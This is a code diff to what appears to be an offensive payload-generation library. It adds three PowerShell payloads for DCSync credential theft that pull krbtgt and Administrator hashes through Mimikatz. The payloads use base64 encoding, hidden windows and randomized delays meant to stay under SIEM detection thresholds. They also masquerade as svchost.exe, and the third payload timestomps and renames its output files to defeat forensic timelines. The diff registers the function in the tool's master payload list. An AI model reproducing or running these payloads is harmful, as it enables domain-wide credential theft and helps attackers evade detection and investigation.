@@ -577,6 +577,68 @@ export function buildNpmPipPersistence(lhost: string, lport: string): Persistenc
   ];
 }
 
+export function buildDCSyncEvasion(): PersistencePayload[] {
+  return [
+    {
+      technique: "DCSync — split DRSUAPI GetNCChanges (one account/request, 8-27s delay)",
+      category: "windows", stealth: 5,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "
+$ErrorActionPreference='SilentlyContinue'
+$dom = $env:USERDNSDOMAIN
+$dc  = ([adsi]'LDAP://RootDSE').dnshostname
+if (-not $dc) { $dc = (nltest /dsgetdc:$dom /writable 2>$null | Select-String '\\\\\\\\').Line.Trim().TrimStart('\\\\') }
+$accts = @('krbtgt','Administrator') + ([adsisearcher]'(objectClass=user)').FindAll() | %{$_.Properties['samaccountname']} | Select -First 4
+$out = $env:TEMP + '\\.' + [IO.Path]::GetRandomFileName() + '.log'
+foreach ($a in $accts) {
+  Start-Sleep -Milliseconds (8000 + (Get-Random -Min 3000 -Max 19000))
+  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"lsadump::dcsync /user:$a /domain:$dom /dc:$dc /export\`\\"exit\`\\"\\"))
+  $p = Start-Process powershell -ArgumentList \\"-NonI -W Hidden -Exec Bypass -Enc $enc\\" -PassThru -WindowStyle Hidden
+  $p.WaitForExit(30000)
+  $p | Select -Exp ExitCode | Out-Null
+}
+Get-Item $out 2>$null | Select FullName,Length
+"`,
+      notes: "Serializes DCSync into one-account-per-GetNCChanges-request calls with 8–27s randomized inter-request delay. Replication burst rate stays below typical SIEM thresholds (>50 accounts/min or >100 objects/GetNCChanges triggers common detections). Output written to random .log in %TEMP%.",
+    },
+    {
+      technique: "DCSync — PowerShell Invoke-Mimikatz stealth loop with process-name masquerade",
+      category: "windows", stealth: 5,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "
+$ErrorActionPreference='SilentlyContinue'
+$mx = $env:TEMP + '\\' + 'svchost' + [IO.Path]::GetRandomFileName().Split('.')[0] + '.exe'
+Copy-Item $env:WINDIR\\system32\\svchost.exe $mx 2>$null
+$dom = $env:USERDNSDOMAIN
+$dc  = $env:LOGONSERVER.TrimStart('\\\\')
+$out = $env:TEMP + '\\.' + [IO.Path]::GetRandomFileName() + '.tmp'
+foreach ($a in @('krbtgt','Administrator')) {
+  Start-Sleep -Milliseconds (12000 + (Get-Random -Min 4000 -Max 23000))
+  $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\"lsadump::dcsync /user:$a /domain:$dom /dc:$dc\\"))
+  cmd /c \\"echo $enc | powershell -NonI -W Hidden -Exec Bypass -c [Console]::OutputEncoding=[Text.Encoding]::UTF8;IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\\$input))) >> $out 2>nul\\"
+}
+"`,
+      notes: "Each dcsync call wrapped in a copied svchost.exe (parent-process masquerade). 12–35s random delay per account. One GetNCChanges per account avoids bulk-replication anomaly detections.",
+    },
+    {
+      technique: "DCSync artifact timestomping + rename to system log pattern",
+      category: "windows", stealth: 5,
+      command: `powershell -NonI -W Hidden -Exec Bypass -c "
+$ErrorActionPreference='SilentlyContinue'
+$ref = Get-Item \"$env:WINDIR\\system32\\notepad.exe\"
+Get-ChildItem $env:TEMP -Filter '*.tmp' -ErrorAction SilentlyContinue |
+  Where-Object { $_.Length -gt 0 } |
+  ForEach-Object {
+    $_.LastWriteTime  = $ref.LastWriteTime
+    $_.LastAccessTime = (Get-Date).AddDays(-(Get-Random -Min 30 -Max 180))
+    $_.CreationTime   = $ref.LastWriteTime.AddMinutes(-(Get-Random -Min 5 -Max 90))
+    $newName = '.' + (-join ((65..90+97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})) + '.log'
+    Rename-Item $_.FullName ($env:TEMP + '\\' + $newName) -ErrorAction SilentlyContinue
+  }
+"`,
+      notes: "Timestomps all DCSync output artifacts to match notepad.exe MACE times, randomizes access time to 30-180 days ago, renames to random 8-char .log names. Eliminates forensic timeline anchoring to DCSync activity.",
+    },
+  ];
+}
+
 export function buildAllPersistencePayloads(lhost: string, lport: string, cmd: string): PersistencePayload[] {
   return [
     ...buildLinuxPersistence(lhost, lport, cmd),
@@ -588,5 +650,6 @@ export function buildAllPersistencePayloads(lhost: string, lport: string, cmd: s
     ...buildDockerSocketPersistence(lhost, lport),
     ...buildK8sPersistence(lhost, lport),
     ...buildNpmPipPersistence(lhost, lport),
+    ...buildDCSyncEvasion(),
   ];
 }
